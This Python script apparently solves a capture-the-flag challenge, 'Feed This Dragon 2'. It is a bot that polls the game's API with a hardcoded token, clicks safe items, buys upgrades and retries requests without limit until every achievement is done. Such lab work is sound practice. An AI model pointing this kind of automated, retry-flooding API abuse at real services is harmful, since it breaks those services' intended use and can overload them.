import requests
import time
import uuid

class Exploit:
    def __init__(self, cookies, session):
        self.headers = {}
        self.cookies = cookies
        self.session = session
        self.url = "https://feedthisdragon2.chall.malicecyber.com/api/v1"
        self.started = False
        self.blacklisted_items = ["trap", "fox"]
        self.intervals = 0.05
        self.bleed_once = False

    def request(self, method = "GET", itemUuid = "", shopUuid = ""):
        if cookies["uuid"] != "":
            self.headers = {
                "Authorization": "mynotsosecrettoken",
                "Session": self.cookies["uuid"],
                "Update": "start",
                "ItemUuid": itemUuid,
                "ShopUuid": shopUuid
            }
            """
            try:
                if method == "GET":
                    response = self.session.get(self.url, headers=self.headers, cookies=self.cookies)
                else:
                    response = self.session.post(self.url, headers=self.headers, cookies=self.cookies)
            except Exception as e:
                print(e)
            """

            while True: # bruteforce powaaaaaa
                try:
                    if method == "GET":
                        response = self.session.get(self.url, headers=self.headers, cookies=self.cookies)
                    else:
                        response = self.session.post(self.url, headers=self.headers, cookies=self.cookies)
                    break
                except Exception as e:
                    print(e)

            json_values = response.json()
            data = response.text
            return json_values

    def click_item(self, item_uuid):
        self.request("POST", item_uuid, "")

    def buy_in_shop(self, upgrade_uuid):
        self.request("POST", "", upgrade_uuid)

    def start(self):
        self.started = True


        while self.started:
            json_values = self.request()

            health = json_values["health"]
            coin = json_values["coin"]
            bag = json_values["bag"]
            hunger_actual = json_values["hunger_actual"]
            hunger_needed = json_values["hunger_needed"]
            level = json_values["level"]
            items = json_values["items"]
            achievements = json_values["achievements"]
            last_achievement_done = achievements[9]["acquired"]
            upgrades = json_values["upgrades"]

            feed_cost, _, feed_level, _, _, feed_uuid = upgrades[0].values()
            greed_cost, _, greed_level, _, _, greed_uuid = upgrades[1].values()
            bag_cost, _, bag_level, _, _, bag_uuid = upgrades[-1].values()

            # I know it is poopy
            achievements_lines = []

            for achievement in achievements:
               achievements_lines.append(str([achievement["acquired"], achievement["description"]]))
            to_print = "\n".join(achievements_lines)
            print(f"[+ Health: {health} | Coins: {coin}/{bag} | Level: {level} - XP: {hunger_actual}/{hunger_needed} | FeedLvl: {feed_level} - GreedLvl: {greed_level} - BagLvl: {bag_level} +]")
            print("="*100+"\n"+to_print+"\n"+"="*100+"\n")

            for item in items:
                if item["type"] not in self.blacklisted_items:
                    self.click_item(item["uuid"])
                elif item["type"] == "trap" and not self.bleed_once:
                    self.click_item(item["uuid"])
                    self.bleed_once = True


            # Should I buy?
            # on pourrait soustraire les golds et faire les achats en un seul tour, mais à tester plus tard si jamais y a besoin
            if feed_cost > bag and greed_cost > bag:
                self.buy_in_shop(bag_uuid)
            else:
                if coin >= feed_cost:
                    self.buy_in_shop(feed_uuid)
                elif coin >= greed_cost:
                    self.buy_in_shop(greed_uuid)

            time.sleep(self.intervals)

            if health == 0:
                self.started = False
                exit("\nYou're dead.")
            elif last_achievement_done:
                exit("Well done!")

if __name__ == "__main__":
    cookies = {"uuid": str(uuid.uuid4()), "achievements":"[]"}
    with requests.Session() as session:
        exploit = Exploit(cookies, session)
        exploit.start()
